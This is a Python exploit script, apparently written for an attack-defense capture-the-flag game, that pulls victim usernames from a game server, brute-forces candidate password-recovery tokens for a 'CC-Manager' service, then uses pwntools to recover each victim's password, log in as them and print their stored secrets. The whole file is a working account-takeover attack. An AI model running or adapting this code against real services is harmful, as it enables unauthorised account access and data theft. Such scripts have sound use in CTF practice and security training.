#!/bin/python
from hashlib import sha256, sha1
from Crypto.Util.number import getPrime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.number import inverse
import random
import re
import requests
import json

from pwn import *

def get_secret_tokens(username):
    mask = (1 << 768) - 1
    p, q = getPrime(768), getPrime(768)

    user_secret = p^q
    username_int = int.from_bytes(username.encode(), byteorder = "big")
    base_value = username_int

    for _ in range(250):
        base_value = base_value * user_secret
        base_value = base_value & mask

    recovery_token_int = ((base_value & ((1 << 256) - 1)) ^ username_int)
    sharing_key = (base_value >> 256) ^ user_secret
    recovery_token = sha256(recovery_token_int.to_bytes(32, byteorder = "big")).hexdigest()[:16]

    return sharing_key, recovery_token

ip = sys.argv[1]
response = requests.get(f"http://10.10.0.1:8081/flagIds?service=CC-Manager&team={ip}")


for users in (response.json()['CC-Manager'][ip]):
    vict = json.loads(users)
    username = vict['username']
    si = set()
    print("generating",flush=True)
    for i in range(0, 100):
        si.add(get_secret_tokens(username))

    print("sending",flush=True)
    for s in si:
        print(s[1].encode(),flush=True)
        r = remote(sys.argv[1], 5000)
        r.sendline(b"3")
        r.sendline(username.encode())
        print(r.recvuntil(b"token:"),flush=True)
        r.sendline(s[1].encode())
        print(s[1].encode(),flush=True)
        #r.sendline(b"b83b3fd445793d6e")
        print(r.recvuntil(b"password:"),flush=True)
        pas = r.recvuntil(b"\n").decode().strip().strip('\n')
        r.recvuntil(b"Exit")
        r.sendline(b"2")
        r.recvuntil(b"username: ")
        r.sendline(username.encode())
        r.recvuntil(b"password: ")
        r.sendline(pas.encode())
        r.recvuntil(b"Exit")
        r.sendline(b"2")
        sus = r.recvuntil(b"What")
        print(sus,flush=True)
        r.close()
